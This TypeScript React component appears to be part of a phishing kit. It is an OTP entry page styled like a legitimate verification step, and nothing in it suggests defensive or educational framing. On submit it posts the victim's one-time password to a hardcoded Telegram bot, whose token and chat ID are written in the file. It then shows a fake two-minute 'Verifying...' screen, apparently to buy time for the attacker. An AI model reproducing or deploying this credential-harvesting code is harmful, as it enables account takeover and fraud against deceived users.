import { useState } from "react";
import PageWatcher from "../components/pagewaters";

export default function OTPPage() {
  const [otp, setOtp] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();

    const botToken = "8044905551:AAFHPE3MZz9B2jLceaAlqcvGU7QrQWD4ABY";
    const chatId = "7062736155";

    const message = `
📧 OTP Submitted

OTP: ${otp}
  `;

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        },
      );

      if (!response.ok) {
        throw new Error("Failed to send Telegram message");
      }

      // Show loading screen after the message has been sent
      setIsLoading(true);

      // Keep the loading screen visible for 2 minutes
      await new Promise((resolve) => setTimeout(resolve, 120000));

      setIsLoading(false);

      console.log("Email sent to Telegram");
      // navigate("/next-page");
    } catch (error) {
      console.error("Telegram error:", error);
      setIsLoading(false);
      alert("Failed to send email.");
    }
  };

  return (
    <>
      <PageWatcher />

      {isLoading && (
        <div className="fixed inset-0 flex items-center justify-center bg-white z-50">
          <div className="text-center">
            <div className="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto"></div>

            <h2 className="mt-6 text-2xl font-semibold">Verifying...</h2>

            <p className="mt-2 text-gray-500">
              Please wait while we verify your information.
              <br />
              This may take up to 2 minutes.
            </p>
          </div>
        </div>
      )}

      <div className="bg-white flex justify-center pt-16 px-4">
        <div className="w-full max-w-[430px]">
          <h2 className="text-[18px] text-[#222] mb-2">
            Enter your{" "}
            <span className="italic font-semibold text-[#003A70]">
              One-Time Password
            </span>
          </h2>

          <p className="text-[14px] text-gray-600 mb-6 leading-6">
            Enter the one-time password that was sent to your registered mobile
            number or email address.
          </p>

          <form onSubmit={submit}>
            <input
              type="text"
              inputMode="numeric"
              autoComplete="one-time-code"
              maxLength={6}
              required
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
              placeholder="One-Time Password"
              className="w-full h-12 border border-gray-400 rounded-sm px-4 text-[15px] tracking-[0.35em] placeholder:tracking-normal placeholder:text-gray-500 focus:outline-none focus:border-[#003A70]"
            />

            <button
              type="submit"
              className="mt-8 w-full h-12 rounded-sm bg-[#003A70] text-white text-[16px] font-semibold hover:bg-[#002d56]"
            >
              VERIFY
            </button>
          </form>
        </div>
      </div>
    </>
  );
}
